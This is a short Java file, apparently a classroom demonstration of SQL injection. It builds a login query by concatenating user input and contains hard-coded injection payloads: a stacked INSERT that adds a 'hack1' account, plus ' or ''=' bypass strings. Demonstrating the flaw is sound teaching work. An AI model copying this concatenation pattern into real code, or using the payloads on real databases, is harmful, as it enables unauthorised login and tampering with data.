package com.theory.sqlinjection;

import com.theory.DBConstant;

import java.sql.*;

public class sqlInjection {
    public static void main(String[] args) {
        try {
            Class.forName(DBConstant.DB_MYSQL_URL);
            Connection connection = DriverManager.getConnection(DBConstant.DB_URL, DBConstant.DB_USER, DBConstant.DB_PASS);
            Statement statement = connection.createStatement();
            String username = "'; INSERT INTO JDBC.utilisateur(id, username, password) VALUES (2, 'hack1', 'hack2');--";
            String password = "any";
            String username1 = " ' or ''='";
            String password1 = " ' or ''='";
            String query = "SELECT * FROM JDBC.users where username = '"
                    + username + "' and password = '" + password + "'";
            ResultSet result = statement.executeQuery(query);
            if (result.next()) {
                System.out.println("id = " + result.getInt("id") + " | username = "
                        + result.getString("username") + " | password = " + result.getString("password"));
            } else {
                System.out.println("Login not correct");
            }
        } catch (ClassNotFoundException | SQLException e) {
            e.printStackTrace();
        }
    }
}
